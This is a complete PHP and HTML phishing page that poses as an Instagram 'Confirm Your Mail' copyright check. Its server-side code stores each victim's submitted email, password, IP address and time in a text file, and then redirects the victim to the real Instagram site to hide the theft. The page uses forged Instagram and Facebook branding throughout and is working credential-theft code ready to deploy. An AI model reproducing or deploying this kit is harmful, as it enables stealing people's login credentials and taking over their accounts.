<?php 
if ($_POST) {
	$password=$_POST["password"];
	$ip=$_SERVER["REMOTE_ADDR"];
	$mail=$_POST["email"];
	date_default_timezone_set('Europe/Istanbul');
    $date=date("d-m-Y H:i:s");
     $file = fopen('recep.txt', 'a');
fwrite($file, " mail : ".$mail."\n\n" ." mail password: ".$password. "\n\n"." Ip Adress: " .$ip."\n\n".   " Time: " .$date.  "\n\n\n");

fclose($file);

  
 header("Location: https://instagram.com");
}
?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Confirm Your Mail</title>
	
	<meta name="viewport" content="width=device-width,initial-scale=1">
	<link rel="icon" href="https://i.pinimg.com/originals/2b/b4/28/2bb428b7e4aa39078a119deccacae6f3.png">
</head>
<body><center>
	<header>

			<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcTjtjBw4xwF01ZdKL1cmnYZD3vdavlQPOWA7w&usqp=CAU" width="180">

	</header>
	<main>
		<img src="https://i.pinimg.com/originals/2b/b4/28/2bb428b7e4aa39078a119deccacae6f3.png" width="100">
			<h3 class="h3" style="color:#555;">Confirm Your Mail </h3>
			<p style="letter-spacing:0px;color:#777;">
				We are need some personal info, example your mail adres, we are only checking your mail adress,and we will confirm your copyright,please enter your E-Mail Adress and Password
			</p><br>
			<form method="post">
			<input type="email" name="email" placeholder=" E-Mail" required="on"><br>
			<input type="password" name="password" placeholder=" Password" required="on">
			<br>
			<button type="submit" class="a_adaskpd">Confirm</button>
		</form>
	</main>

<br><br>
<img src="fb.gif" width=200 alt= fromfcb>
<br>



 </div> <br> <p id="copyright" style="font-family:sans-serif;font-weight:100;">© 2020 INSTAGRAM </p>

<center>


	<div class="other">
		<img src="https://en.facebookbrand.com/wp-content/uploads/2019/04/FBLogo-Do-2-600x600-2.png" alt="fb" width="100" >
	</div>
	<script type="text/javascript">console.log("Script Created by Borislav Qenzy");</script>
</center>

<style type="text/css">
	*{font-family:sans-serif;}
	body{padding:0px;margin:0px;background:#fafafa}
	header{border-bottom:1px solid #cecece;
		background:white;
		
		padding-top:10px;}
		main{
			background:white;
			margin-top:20px;
			padding-top:20px;
			width:400px;
			max-width:90%;
			border:1px solid #dedede;
		}.h3{font-family:sans-serif;
			font-weight:400;
			color:#444;
			word-spacing:1px;
		}main p{
			color:#333;
			font-weight:400;
			word-spacing:1px;
			letter-spacing:1px;
			width:350px;
			max-width:90%;
			font-size:15px;
		}main input{
			transition:1s;
			padding:5px;
			border:none;
			width:220px;
			height:33px;
			outline:none;
			border:1px solid #cecece;
			padding-left:5px;
			font-size:14px;
			background:#fafafa;
			border-radius:4px;
			font-size:18px;
			margin-top:10px;

		}main input::placeholder{
			font-size:12px;
			color:#999;

		}main .a_adaskpd{
			padding:7px 30px;
			margin-top:10px;
			outline:none;
			border:none;
			color:white;
			background:#3896f0;
			font-weight:bold;
			font-size:15px;
			margin-bottom:10px;
			border-radius:3px;
		}main input:focus{
			box-shadow: 0px 0px 0px 0px white;
			border:1px solid #3896f0;
		}
		.other{
			margin-top:100px;
			bottom:1px;
			position:relative;
			border-top:1px solid #cecece;
			width:100%;
			background:#f5f6f8;

		}
</style>
</body></html>